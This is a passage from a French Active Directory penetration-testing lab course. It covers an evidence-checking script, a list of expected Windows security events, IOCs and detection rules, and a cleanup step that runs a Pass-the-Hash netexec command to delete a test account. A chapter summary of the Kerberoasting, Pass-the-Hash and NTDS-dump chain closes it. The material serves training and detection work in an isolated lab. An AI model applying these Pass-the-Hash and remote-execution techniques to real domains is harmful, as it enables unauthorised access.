# Verification de chaque fichier de preuve attendu
for fichier in "${FICHIERS_ATTENDUS[@]}"; do
  if [ ! -f "$fichier" ]; then
    echo "[!] Preuve manquante : $fichier"
    ERREURS=$((ERREURS + 1))
    continue
  fi
  if ! grep -q '^# date:' "$fichier"; then
    echo "[!] Entete # date: absent dans $fichier"
    ERREURS=$((ERREURS + 1))
  fi
  if ! grep -q '^# cmd:' "$fichier"; then
    echo "[!] Entete # cmd: absent dans $fichier"
    ERREURS=$((ERREURS + 1))
  fi
  if ! grep -q '^# rc=' "$fichier"; then
    echo "[!] Code retour # rc= absent dans $fichier"
    ERREURS=$((ERREURS + 1))
  fi
done

# Rapport final et code de sortie
if [ "$ERREURS" -eq 0 ]; then
  echo "[OK] Toutes les preuves sont presentes et completees."
else
  echo "[!] $ERREURS anomalie(s) detectee(s). Relancer les labs correspondants."
fi
exit $ERREURS
EOF
prouve preuves/ch3-lab05/verif-preuves.txt bash preuves/ch3-lab05/verif-preuves.sh
```

**Explication de la commande**

- `cat > ... <<'EOF' ... EOF` : écrit le script `verif-preuves.sh` bloc par bloc ; `<<'EOF'` (guillemets simples autour du délimiteur) empêche l'expansion des variables et des substitutions de commande pendant l'écriture.
- `#!/usr/bin/env bash` : shebang indiquant l'interpréteur du script.
- `set -u` : fait échouer le script si une variable non définie est utilisée (sécurité).
- `LAB_DIRS` : liste des répertoires de laboratoire à vérifier.
- `FICHIERS_ATTENDUS` : tableau des chemins de preuve attendus, un par commande exécutée aux Labs 01 à 04.
- `ERREURS=0` : compteur d'anomalies, incrémenté à chaque problème détecté.
- Première boucle `for lab` : vérifie l'existence de chaque répertoire de laboratoire.
- Deuxième boucle `for fichier` : pour chaque preuve attendue, vérifie l'existence du fichier puis la présence des entêtes `# date:`, `# cmd:`, `# rc=` avec `grep -q`.
- Rapport final : affiche `[OK]` si aucune anomalie, sinon le nombre d'anomalies et quitte avec ce code de sortie.
- `prouve preuves/ch3-lab05/verif-preuves.txt bash ...` : exécute le script et journalise sa sortie et son code retour.
- Piège courant : sans les guillemets autour de `EOF`, le shell interpréterait `$((ERREURS + 1))` et les `$` du script pendant l'écriture ; le script écrit serait corrompu.

**Résultat attendu**

```text
[*] Verification du laboratoire ch3-lab01
[*] Verification du laboratoire ch3-lab02
[*] Verification du laboratoire ch3-lab03
[*] Verification du laboratoire ch3-lab04
[OK] Toutes les preuves sont presentes et completees.
```

**Preuve** : `preuves/ch3-lab05/verif-preuves.txt` (contient `# date:`, `# cmd:`, `# rc=`), et le script `preuves/ch3-lab05/verif-preuves.sh` est conservé comme preuve du processus de vérification.

#### Étape 3 — Tableau de détection, événements Windows et IOC

**But** — consigner les événements de détection attendus produits par la chaîne d'attaque et les indicateurs de compromission, pour le rapport d'audit et le chapitre 4 (forensique).

**Machine** — Kali `192.168.56.101` (documentation uniquement, aucune commande offensive).

**Prérequis** — Labs 01 à 04 terminés.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab05/detection-attendue.txt cat <<'EOF'
Evenements Windows attendus (controleur de domaine WS2016-DC, 192.168.56.102) :
  4768  Demande de TGT Kerberos                      -> authentification labuser (Lab-01/02)
  4769  Demande de TGS Kerberos                      -> Kerberoasting svc_web ; chiffrement RC4 (0x17) suspect
  4624  Type 3 (ouverture reseau), package NTLM      -> Pass-the-Hash depuis 192.168.56.101 (Lab-03/04)
  4625  Echec d'authentification                     -> tentatives LDAP infructueuses
  4672  Privilèges spéciaux attribués                -> session Administrator (Lab-04)
  4720  Creation de compte utilisateur               -> creation de labadmin (Lab-04)
  4726  Suppression de compte                        -> nettoyage (Lab-04 etape 4 / Lab-05)
  4740  Verrouillage de compte                       -> politique de verrouillage du domaine
  Acces aux partages ADMIN$ / C$                     -> secretsdump et exécution distante (Lab-03/04)

Indicateurs de compromission (IOC) du chapitre :
  - Adresse IP source : 192.168.56.101 (Kali)
  - Comptes impliques : svc_web, Administrator, labadmin
  - Nombre anormal de tickets TGS demandes par un utilisateur (Kerberoasting)
  - Tickets TGS demandes pour des comptes de service (SPN)
  - Acces aux partages administratifs depuis une station non gerée
  - Creation d'un objet utilisateur dans l'annuaire Active Directory

Regles de détection (exemple, a adapter au SIEM) :
  - Kerberoasting : ID 4769, demandeur != compte de service habituel, volume > seuil, chiffrement RC4 (0x17)
  - Pass-the-Hash : ID 4624 type 3, package NTLM, source 192.168.56.101, cible contrôleur de domaine
  - Creation de compte : ID 4720, compte labadmin, initiateur Administrator
EOF
```

**Explication de la commande**

- `cat <<'EOF' ... EOF` : écrit un bloc de texte multiligne dans le fichier de preuve ; `<<'EOF'` empêche toute expansion shell à l'intérieur du bloc.
- Le contenu recense les événements Windows d'audit (IDS source de données DS0028 Logon Session et DS0026 Active Directory) et les IOC du chapitre.
- Ce fichier alimente le rapport d'audit et la transition vers le chapitre 4 (capture et analyse réseau avec Wireshark).
- Piège courant : sans guillemets autour de `EOF`, les symboles `$` ou les retours à la ligne du texte pourraient être interprétés par le shell.

**Résultat attendu**

```text
Evenements Windows attendus (controleur de domaine WS2016-DC, 192.168.56.102) :
  4768  Demande de TGT Kerberos                      -> authentification labuser (Lab-01/02)
  4769  Demande de TGS Kerberos                      -> Kerberoasting svc_web ; chiffrement RC4 (0x17) suspect
  ...
[OK] fichiers de detection rediges dans preuves/ch3-lab05/detection-attendue.txt
```

**Preuve** : `preuves/ch3-lab05/detection-attendue.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 4 — Nettoyage du compte de test et rollback du snapshot

**But** — supprimer le compte de test `labadmin` du domaine pour restaurer l'annuaire, puis restaurer le snapshot propre de Windows Server 2016 pris avant exploitation.

**Machine** — Kali `192.168.56.101` pour le nettoyage ; hôte VirtualBox pour le rollback du snapshot.

**Prérequis** — Labs 01 à 04 terminés, hachage d'`Administrator` connu, droits d'administration sur le DC.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande (nettoyage sur le domaine)**

```bash
prouve preuves/ch3-lab05/nettoyage.txt nxc smb 192.168.56.102 -u 'Administrator' -H <NTLM_HASH_ADMIN> -x 'net user labadmin /delete /domain'
```

**Explication de la commande**

- `net user labadmin /delete /domain` : supprime le compte `labadmin` de l'annuaire Active Directory (commande Windows exécutée à distance via SMB).
- `-u 'Administrator' -H <NTLM_HASH_ADMIN>` : authentification par Pass-the-Hash avec le hachage d'`Administrator` (étape 1 du Lab-04).
- Piège courant : supprimer le compte avant d'en avoir fini avec les vérifications rendrait Lab-04 étape 4 impossible ; ce nettoyage est volontairement placé en dernier.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Executed command. Output:
The command completed successfully.
```

**Preuve** : `preuves/ch3-lab05/nettoyage.txt` (contient `# date:`, `# cmd:`, `# rc=`).

**Rollback du snapshot (hôte, VirtualBox)** — depuis l'hôte (pas de cible réelle, uniquement l'hyperviseur du laboratoire), restaurez le snapshot propre de Windows Server 2016 pris avant le début des Labs :

```bash
# Sur l'hôte VirtualBox (exemple, adapter le nom de la VM et du snapshot)
VBoxManage snapshot "Windows Server 2016" restore "Etat sain avant exploitation chapitre 3"
VBoxManage startvm "Windows Server 2016" --type headless
```

Ce rollback remet le contrôleur de domaine dans son état sain (compte `labadmin` supprimé, modifications annulées). Le chapitre 3 est alors terminé ; l'environnement est prêt pour le chapitre 4 (forensique réseau avec Wireshark).

### En conclusion

Lab-05 a validé la complétude des preuves du chapitre 3 (tous les fichiers contiennent `# date:`, `# cmd:`, `# rc=`), consolidé les événements de détection attendus (`4768`, `4769`, `4624` type 3 NTLM, `4672`, `4720`, `4726`, `4740`) et les IOC, et nettoyé l'environnement par la suppression de `labadmin` et le rollback du snapshot de Windows Server 2016 `192.168.56.102`.

Le chapitre 3 a démontré, en réel sur les VMs de laboratoire, la chaîne complète : reconnaissance LDAP, Kerberoasting avec crackage du compte de service, Pass-the-Hash et exécution distante, dump des secrets du domaine et compromission d'`Administrator`, élévation par création de compte de domaine, puis détection et restauration. Ces preuves d'accès et de compromission d'Active Directory constituent le livrable du chapitre 3 et alimentent le chapitre 4 (capture et analyse du trafic réseau associé avec Wireshark).

## 8. En conclusion du chapitre

Ce chapitre a couvert les attaques sur Windows Server et Active Directory dans le laboratoire isolé `192.168.56.0/24` :

- Lab-01 : énumération LDAP de l'annuaire, découverte des comptes et du SPN de `svc_web` (`T1087.002`, `T1482`, `T1018`) ;
- Lab-02 : Kerberoasting du compte de service et crackage hors ligne du mot de passe `S3rviceWeb!` (`T1558.003`, `T1110.002`) ;
- Lab-03 : Pass-the-Hash et exécution de commandes à distance en tant que `LAB\svc_web` (`T1550.002`, `T1021.002`) ;
- Lab-04 : dump des secrets du domaine (NTDS), Pass-the-Hash d'`Administrator`, création du compte de domaine `labadmin` (`T1003.003`, `T1550.002`, `T1078`, `T1098`) ;
- Lab-05 : vérification des preuves, détection (événements `4768`/`4769`/`4624`/`4672`/`4720`/`4726`/`4740`), IOC, nettoyage et rollback du snapshot de Windows Server 2016 `192.168.56.102`.

Tous les exploits et commandes ont été exécutés en réel sur les VMs de laboratoire, avec preuves horodatées (`# date:`, `# cmd:`, `# rc=`) et rattachement MITRE ATT&CK. Aucune cible réelle n'a été sollicitée et aucune activité n'a eu lieu vers Internet.

Critères de réussite du chapitre : chaque lab a abouti (comptes énumérés, mot de passe de service cracké, accès distant obtenu, hachage d'administrateur récupéré, compte de domaine créé et vérifié, preuves complètes et snapshot restauré). Le chapitre 4 prend ensuite le relais pour la capture et l'analyse forensique du trafic réseau associé (Wireshark).
